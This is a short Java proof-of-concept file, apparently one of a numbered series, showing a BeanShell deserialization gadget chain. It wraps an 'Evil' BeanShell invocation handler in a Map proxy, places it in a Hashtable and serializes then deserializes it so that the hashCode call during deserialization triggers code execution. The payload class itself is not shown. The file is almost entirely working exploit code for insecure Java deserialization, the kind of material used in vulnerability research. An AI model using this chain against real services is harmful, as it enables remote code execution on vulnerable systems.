package com.example.BeanShell;

import com.example.Evil.BeanShellCalc;
import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Hashtable;
import java.util.Map;

public class POC_8 {

    /***
     * Hashtable, similar to HashMap
     */

    public static void main(String[] args) throws Exception {
        InvocationHandler handler = BeanShellCalc.getHandler("hashCode");
        Map m = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class<?>[]{Map.class}, handler);

        Hashtable hashtable = ReflectionUtil.makeTable(m);

        SerializeUtil.deserialize(SerializeUtil.serialize(hashtable));
    }

}
